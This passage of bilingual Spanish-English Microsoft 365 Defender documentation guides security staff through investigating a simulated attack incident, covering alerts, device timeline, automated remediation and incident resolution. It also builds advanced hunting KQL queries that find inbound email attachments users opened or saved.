<span data-ttu-id="b1fec-212">Tenga en cuenta que los detalles de la alerta incluyen la dirección IP externa, un indicador que puede usar como control dinámico para ampliar la investigación.</span><span class="sxs-lookup"><span data-stu-id="b1fec-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="b1fec-213">Seleccione la dirección IP en el árbol de procesos de alerta para ver la página de detalles de la dirección IP.</span><span class="sxs-lookup"><span data-stu-id="b1fec-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Captura de pantalla de la alerta para un comportamiento inesperado de un proceso ejecutado sin argumentos de línea de comandos](../../media/mtp/fig8.png)

<span data-ttu-id="b1fec-215">En la figura siguiente se muestra la página de detalles de la dirección IP seleccionada (al hacer clic en dirección IP en el árbol de procesos de alerta).</span><span class="sxs-lookup"><span data-stu-id="b1fec-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="b1fec-216">![Captura de pantalla de la página de detalles de la dirección IP](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="b1fec-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="b1fec-217">Alerta: Reconocimiento de usuarios y direcciones IP (SMB) (origen: Microsoft Defender para identidad)</span><span class="sxs-lookup"><span data-stu-id="b1fec-217">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="b1fec-218">La enumeración que usa el protocolo de bloqueo de mensajes de servidor (SMB) permite a los atacantes obtener información de inicio de sesión de usuario reciente que les ayuda a moverse lateralmente por la red para obtener acceso a una cuenta confidencial específica.</span><span class="sxs-lookup"><span data-stu-id="b1fec-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="b1fec-219">En esta detección, se desencadena una alerta cuando la enumeración de sesión SMB se ejecuta en un controlador de dominio.</span><span class="sxs-lookup"><span data-stu-id="b1fec-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Captura de pantalla de la alerta de Identidad de Microsoft Defender para reconocimiento de direcciones IP y usuarios](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="b1fec-221">Revisar la escala de tiempo del dispositivo [Microsoft Defender para endpoint]</span><span class="sxs-lookup"><span data-stu-id="b1fec-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>

<span data-ttu-id="b1fec-222">Después de explorar las distintas alertas de este incidente, vuelva a la página del incidente que investigó anteriormente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="b1fec-223">Selecciona la **pestaña Dispositivos** en la página de incidentes para revisar los dispositivos implicados en este incidente, tal y como lo han notificado Microsoft Defender para Endpoint y Microsoft Defender for Identity.</span><span class="sxs-lookup"><span data-stu-id="b1fec-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="b1fec-224">Selecciona el nombre del dispositivo donde se ha llevado a cabo el ataque para abrir la página de entidad para ese dispositivo específico.</span><span class="sxs-lookup"><span data-stu-id="b1fec-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="b1fec-225">En esa página, puede ver alertas que se desencadenaron y eventos relacionados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="b1fec-226">Selecciona **la** pestaña Escala de tiempo para abrir la escala de tiempo del dispositivo y ver todos los eventos y comportamientos observados en el dispositivo en orden cronológico, intercalados con las alertas generadas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Captura de pantalla de la escala de tiempo del dispositivo con comportamientos](../../media/mtp/fig11.png)

<span data-ttu-id="b1fec-228">La expansión de algunos de los comportamientos más interesantes proporciona detalles útiles, como árboles de proceso.</span><span class="sxs-lookup"><span data-stu-id="b1fec-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="b1fec-229">Por ejemplo, desplácese hacia abajo hasta encontrar el evento de alerta inserción **de proceso sospechoso observado.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="b1fec-230">Seleccione lapowershell.exe se inserta **notepad.exe** evento de proceso debajo de él, para mostrar  el árbol de procesos completo para este comportamiento en el gráfico Entidades de eventos en el panel lateral.</span><span class="sxs-lookup"><span data-stu-id="b1fec-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="b1fec-231">Use la barra de búsqueda para filtrar si es necesario.</span><span class="sxs-lookup"><span data-stu-id="b1fec-231">Use the search bar for filtering if necessary.</span></span>

![Captura de pantalla del árbol de procesos para el comportamiento de creación de archivos de PowerShell seleccionado](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="b1fec-233">Revisar la información del usuario [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="b1fec-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="b1fec-234">En la página de incidentes, seleccione la **pestaña** Usuarios para mostrar la lista de usuarios implicados en el ataque.</span><span class="sxs-lookup"><span data-stu-id="b1fec-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="b1fec-235">La tabla contiene información adicional sobre cada usuario, incluida la puntuación de prioridad de **investigación de cada** usuario.</span><span class="sxs-lookup"><span data-stu-id="b1fec-235">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="b1fec-236">Seleccione el nombre de usuario para abrir la página de perfil del usuario, donde se pueden llevar a cabo más investigaciones.</span><span class="sxs-lookup"><span data-stu-id="b1fec-236">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="b1fec-237">[Obtenga más información sobre cómo investigar usuarios de riesgo.](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="b1fec-237">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>

![Captura de pantalla de la página de usuario de Cloud App Security](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="b1fec-239">Investigación y corrección automatizadas</span><span class="sxs-lookup"><span data-stu-id="b1fec-239">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="b1fec-240">Antes de ayudarle a través de esta simulación, vea el siguiente vídeo para familiarizarse con lo que es la recuperación automática, dónde encontrarla en el portal y cómo puede ayudar en las operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="b1fec-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="b1fec-241">Vuelva al incidente en el portal del Centro de seguridad de Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="b1fec-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="b1fec-242">La **pestaña Investigaciones** de **la** página Incidente muestra las investigaciones automatizadas desencadenadas por Microsoft Defender para Identity y Microsoft Defender para Endpoint.</span><span class="sxs-lookup"><span data-stu-id="b1fec-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="b1fec-243">La captura de pantalla siguiente muestra solo la investigación automatizada desencadenada por Defender para Endpoint.</span><span class="sxs-lookup"><span data-stu-id="b1fec-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="b1fec-244">De forma predeterminada, Defender para extremo corrige automáticamente los artefactos que se encuentran en la cola, lo que requiere corrección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Captura de pantalla de investigaciones automatizadas relacionadas con el incidente](../../media/mtp/fig14.png)

<span data-ttu-id="b1fec-246">Seleccione la alerta que desencadenó una investigación para abrir la **página de detalles de investigación.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="b1fec-247">Verá los siguientes detalles:</span><span class="sxs-lookup"><span data-stu-id="b1fec-247">You'll see the following details:</span></span>

- <span data-ttu-id="b1fec-248">Alertas que desencadenaron la investigación automatizada.</span><span class="sxs-lookup"><span data-stu-id="b1fec-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="b1fec-249">Usuarios y dispositivos afectados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-249">Impacted users and devices.</span></span> <span data-ttu-id="b1fec-250">Si se encuentran indicadores en dispositivos adicionales, también se mostrarán estos dispositivos adicionales.</span><span class="sxs-lookup"><span data-stu-id="b1fec-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="b1fec-251">Lista de pruebas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-251">List of evidence.</span></span> <span data-ttu-id="b1fec-252">Las entidades encontradas y analizadas, como archivos, procesos, servicios, controladores y direcciones de red.</span><span class="sxs-lookup"><span data-stu-id="b1fec-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="b1fec-253">Estas entidades se analizan para buscar posibles relaciones con la alerta y se califican como benignas o malintencionadas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="b1fec-254">Amenazas encontradas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-254">Threats found.</span></span> <span data-ttu-id="b1fec-255">Amenazas conocidas que se encuentran durante la investigación.</span><span class="sxs-lookup"><span data-stu-id="b1fec-255">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-256">En función de los intervalos, es posible que la investigación automatizada aún se esté ejecutando.</span><span class="sxs-lookup"><span data-stu-id="b1fec-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="b1fec-257">Espere unos minutos hasta que se complete el proceso antes de recopilar y analizar las pruebas y revisar los resultados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="b1fec-258">Actualice la **página de detalles de** investigación para obtener los resultados más recientes.</span><span class="sxs-lookup"><span data-stu-id="b1fec-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Captura de pantalla de la página de detalles de la investigación](../../media/mtp/fig15.png)

<span data-ttu-id="b1fec-260">Durante la investigación automatizada, Microsoft Defender para Endpoint identificó el proceso notepad.exe, que se inyectó como uno de los artefactos que requieren corrección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="b1fec-261">Defender for Endpoint detiene automáticamente la inserción de procesos sospechosos como parte de la corrección automatizada.</span><span class="sxs-lookup"><span data-stu-id="b1fec-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="b1fec-262">Puedes ver que <i>notepad.exe</i> de la lista de procesos en ejecución en el dispositivo de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="b1fec-263">Resolver el incidente</span><span class="sxs-lookup"><span data-stu-id="b1fec-263">Resolve the incident</span></span>

<span data-ttu-id="b1fec-264">Una vez completada la investigación y confirmada su corrección, cierre el incidente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="b1fec-265">Seleccione **Administrar incidente.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-265">Select **Manage incident**.</span></span> <span data-ttu-id="b1fec-266">Establezca el estado en **Resolver incidente** y seleccione la clasificación correspondiente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="b1fec-267">Cuando se resuelve el incidente, cierra todas las alertas asociadas en el Centro de seguridad de Microsoft 365 y en los portales relacionados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Screenshot of the incidents page with the open Manage incident panel where you can click the switch to resolve incident](../../media/mtp/fig16.png)

<span data-ttu-id="b1fec-269">Esto encapsula la simulación de ataques para la administración de incidentes y los escenarios automatizados de investigación y corrección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="b1fec-270">La siguiente simulación te llevará a través de la búsqueda proactiva de amenazas en busca de archivos potencialmente malintencionados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span>

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="b1fec-271">Escenario de búsqueda avanzada</span><span class="sxs-lookup"><span data-stu-id="b1fec-271">Advanced hunting scenario</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-272">Antes de ayudarle a través de la simulación, vea el siguiente vídeo para comprender los conceptos de búsqueda avanzada, ver dónde puede encontrarlo en el portal y saber cómo puede ayudarle en sus operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="b1fec-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="b1fec-273">Requisitos del entorno de búsqueda</span><span class="sxs-lookup"><span data-stu-id="b1fec-273">Hunting environment requirements</span></span>

<span data-ttu-id="b1fec-274">Hay un único buzón interno y un dispositivo necesarios para este escenario.</span><span class="sxs-lookup"><span data-stu-id="b1fec-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="b1fec-275">También necesitará una cuenta de correo electrónico externa para enviar el mensaje de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-275">You'll also need an external email account to send the test message.</span></span>

1. <span data-ttu-id="b1fec-276">Compruebe que su espacio empresarial ha [habilitado Microsoft 365 Defender.](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)</span><span class="sxs-lookup"><span data-stu-id="b1fec-276">Verify that your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2. <span data-ttu-id="b1fec-277">Identificar un buzón de destino que se usará para recibir correo electrónico.</span><span class="sxs-lookup"><span data-stu-id="b1fec-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="b1fec-278">a.</span><span class="sxs-lookup"><span data-stu-id="b1fec-278">a.</span></span> <span data-ttu-id="b1fec-279">Microsoft Defender debe supervisar este buzón para Office 365 b.</span><span class="sxs-lookup"><span data-stu-id="b1fec-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span> <span data-ttu-id="b1fec-280">El dispositivo del requisito 3 debe tener acceso a este buzón</span><span class="sxs-lookup"><span data-stu-id="b1fec-280">The device from requirement 3 needs to access this mailbox</span></span>
3. <span data-ttu-id="b1fec-281">Configurar un dispositivo de prueba: a.</span><span class="sxs-lookup"><span data-stu-id="b1fec-281">Configure a test device: a.</span></span> <span data-ttu-id="b1fec-282">Asegúrate de usar Windows 10 versión 1903 o posterior.</span><span class="sxs-lookup"><span data-stu-id="b1fec-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="b1fec-283">b.</span><span class="sxs-lookup"><span data-stu-id="b1fec-283">b.</span></span> <span data-ttu-id="b1fec-284">Unir el dispositivo de prueba al dominio de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="b1fec-285">c.</span><span class="sxs-lookup"><span data-stu-id="b1fec-285">c.</span></span> <span data-ttu-id="b1fec-286">[Activar el antivirus Windows Defender.](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)</span><span class="sxs-lookup"><span data-stu-id="b1fec-286">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="b1fec-287">Si tiene problemas para habilitar Windows Defender Antivirus, consulte [este tema de solución de problemas.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="b1fec-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="b1fec-288">d.</span><span class="sxs-lookup"><span data-stu-id="b1fec-288">d.</span></span> <span data-ttu-id="b1fec-289">[Incorporar a Microsoft Defender para endpoint.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="b1fec-289">[Onboard to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="b1fec-290">Ejecutar la simulación</span><span class="sxs-lookup"><span data-stu-id="b1fec-290">Run the simulation</span></span>

1. <span data-ttu-id="b1fec-291">Desde una cuenta de correo electrónico externa, envíe un correo electrónico al buzón identificado en el paso 2 de la sección de requisitos del entorno de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="b1fec-292">Incluir datos adjuntos que se permitirán a través de las directivas de filtro de correo electrónico existentes.</span><span class="sxs-lookup"><span data-stu-id="b1fec-292">Include an attachment that will be allowed through any existing email filter policies.</span></span> <span data-ttu-id="b1fec-293">Este archivo no necesita ser malintencionado o ejecutable.</span><span class="sxs-lookup"><span data-stu-id="b1fec-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="b1fec-294">Los tipos de archivo sugeridos <i>son .pdf</i>, <i>.exe</i> (si se permite) u documentos de Office, como un archivo de Word.</span><span class="sxs-lookup"><span data-stu-id="b1fec-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2. <span data-ttu-id="b1fec-295">Abra el correo electrónico enviado desde el dispositivo configurado como se define en el paso 3 de la sección de requisitos del entorno de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="b1fec-296">Abra los datos adjuntos o guarde el archivo en el dispositivo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-296">Either open the attachment or save the file to the device.</span></span>

#### <a name="go-hunting"></a><span data-ttu-id="b1fec-297">Ir a buscar</span><span class="sxs-lookup"><span data-stu-id="b1fec-297">Go hunting</span></span>

1. <span data-ttu-id="b1fec-298">Abra el portal security.microsoft.com web.</span><span class="sxs-lookup"><span data-stu-id="b1fec-298">Open the security.microsoft.com portal.</span></span>

2. <span data-ttu-id="b1fec-299">Vaya a **Búsqueda > búsqueda avanzada.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-299">Navigate to **Hunting > Advanced hunting**.</span></span>

   ![Captura de pantalla de la búsqueda avanzada en la barra de navegación del portal del Centro de seguridad de M365](../../media/mtp/fig17.png)

3. <span data-ttu-id="b1fec-301">Cree una consulta que comience recopilando eventos de correo electrónico.</span><span class="sxs-lookup"><span data-stu-id="b1fec-301">Build a query that starts by gathering email events.</span></span>

   1. <span data-ttu-id="b1fec-302">En el panel de consultas, seleccione Nuevo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-302">From the query pane, select New.</span></span>

   1. <span data-ttu-id="b1fec-303">Haga doble clic en la tabla EmailEvents del esquema.</span><span class="sxs-lookup"><span data-stu-id="b1fec-303">Double-click on the EmailEvents table from the schema.</span></span>

      ```console
      EmailEvents
      ```

   1. <span data-ttu-id="b1fec-304">Cambie el período de tiempo a las últimas 24 horas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="b1fec-305">Suponiendo que el correo electrónico que envió cuando ejecutó la simulación anterior fue en las últimas 24 horas, cambie el período de tiempo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>

      ![Captura de pantalla de dónde puede cambiar el período de tiempo.](../../media/mtp/fig18.png)

   1. <span data-ttu-id="b1fec-308">Ejecute la consulta.</span><span class="sxs-lookup"><span data-stu-id="b1fec-308">Run the query.</span></span> <span data-ttu-id="b1fec-309">Es posible que tenga muchos resultados según el entorno de la prueba piloto.</span><span class="sxs-lookup"><span data-stu-id="b1fec-309">You may have many results depending on the environment for the pilot.</span></span>

      > [!NOTE]
      > <span data-ttu-id="b1fec-310">Vea el siguiente paso para filtrar las opciones para limitar la devolución de datos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-310">See the next step for filtering options to limit data return.</span></span>

      ![Captura de pantalla de los resultados de la consulta de búsqueda avanzada](../../media/mtp/fig19.png)

        > [!NOTE]
        > <span data-ttu-id="b1fec-312">La búsqueda avanzada muestra los resultados de la consulta como datos tabulares.</span><span class="sxs-lookup"><span data-stu-id="b1fec-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="b1fec-313">También puede optar por ver los datos en otros tipos de formato, como gráficos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-313">You can also opt to view the data in other format types such as charts.</span></span>

   1. <span data-ttu-id="b1fec-314">Consulte los resultados y vea si puede identificar el correo electrónico que abrió.</span><span class="sxs-lookup"><span data-stu-id="b1fec-314">Look at the results and see if you can identify the email you opened.</span></span> <span data-ttu-id="b1fec-315">El mensaje puede tardar hasta 2 horas en aparecer en la búsqueda avanzada.</span><span class="sxs-lookup"><span data-stu-id="b1fec-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="b1fec-316">Si el entorno de correo electrónico es grande y hay muchos resultados, es posible que desee usar la opción Mostrar filtros **para** encontrar el mensaje.</span><span class="sxs-lookup"><span data-stu-id="b1fec-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span>

      <span data-ttu-id="b1fec-317">En el ejemplo, el correo electrónico se envió desde una cuenta de Yahoo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="b1fec-318">Haga clic en el icono yahoo.com en la sección SenderFromDomain y, a continuación, haga clic en Aplicar para agregar **+** el dominio seleccionado a la consulta.  </span><span class="sxs-lookup"><span data-stu-id="b1fec-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span> <span data-ttu-id="b1fec-319">Use el dominio o la cuenta de correo electrónico que se usó para enviar el mensaje de prueba en el paso 1 de Ejecutar la simulación para filtrar los resultados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span> <span data-ttu-id="b1fec-320">Vuelva a ejecutar la consulta para obtener un conjunto de resultados más pequeño para comprobar que ve el mensaje de la simulación.</span><span class="sxs-lookup"><span data-stu-id="b1fec-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>

      ![Captura de pantalla de los filtros.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. <span data-ttu-id="b1fec-323">Haga clic en las filas resultantes de la consulta para poder inspeccionar el registro.</span><span class="sxs-lookup"><span data-stu-id="b1fec-323">Click the resulting rows from the query so you can inspect the record.</span></span>

      ![Captura de pantalla del panel lateral del registro de inspección que se abre cuando se selecciona un resultado de búsqueda avanzada](../../media/mtp/fig21.png)

4. <span data-ttu-id="b1fec-325">Ahora que ha comprobado que puede ver el correo electrónico, agregue un filtro para los datos adjuntos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="b1fec-326">Céntrate en todos los correos electrónicos con datos adjuntos en el entorno.</span><span class="sxs-lookup"><span data-stu-id="b1fec-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="b1fec-327">Para este escenario, céntrate en los correos electrónicos entrantes, no en los que se envían desde su entorno.</span><span class="sxs-lookup"><span data-stu-id="b1fec-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="b1fec-328">Quite los filtros que haya agregado para localizar el mensaje y agregue "| donde **AttachmentCount > 0** y **EmailDirection**  ==  **"Inbound""**</span><span class="sxs-lookup"><span data-stu-id="b1fec-328">Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**</span></span>

   <span data-ttu-id="b1fec-329">La siguiente consulta le mostrará el resultado con una lista más corta que la consulta inicial para todos los eventos de correo electrónico:</span><span class="sxs-lookup"><span data-stu-id="b1fec-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. <span data-ttu-id="b1fec-330">A continuación, incluya la información sobre los datos adjuntos (por ejemplo, nombre de archivo, hashes) en el conjunto de resultados.</span><span class="sxs-lookup"><span data-stu-id="b1fec-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="b1fec-331">Para ello, una la **tabla EmailAttachmentInfo.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="b1fec-332">Los campos comunes que se usarán para unirse, en este caso **son NetworkMessageId** y **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="b1fec-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

   <span data-ttu-id="b1fec-333">La siguiente consulta también incluye una línea adicional "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span><span class="sxs-lookup"><span data-stu-id="b1fec-333">The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. <span data-ttu-id="b1fec-334">A continuación, use el valor **SHA256** de la tabla **EmailAttachmentInfo** para buscar **DeviceFileEvents** (acciones de archivo que ocurrieron en el punto de conexión) para ese hash.</span><span class="sxs-lookup"><span data-stu-id="b1fec-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span> <span data-ttu-id="b1fec-335">El campo común aquí será el hash SHA256 para los datos adjuntos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-335">The common field here will be the SHA256 hash for the attachment.</span></span>

   <span data-ttu-id="b1fec-336">La tabla resultante ahora incluye detalles del punto de conexión (Microsoft Defender para Endpoint), como el nombre del dispositivo, la acción que se ha realizado (en este caso, filtrada para incluir solo eventos FileCreated) y dónde se ha almacenado el archivo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="b1fec-337">También se incluirá el nombre de cuenta asociado al proceso.</span><span class="sxs-lookup"><span data-stu-id="b1fec-337">The account name associated with the process will also be included.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   <span data-ttu-id="b1fec-338">Ahora ha creado una consulta que identificará todos los correos electrónicos entrantes en los que el usuario abrió o guardó los datos adjuntos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="b1fec-339">También puede refinar esta consulta para filtrar dominios de remitentes específicos, tamaños de archivo, tipos de archivo, entre otros.</span><span class="sxs-lookup"><span data-stu-id="b1fec-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

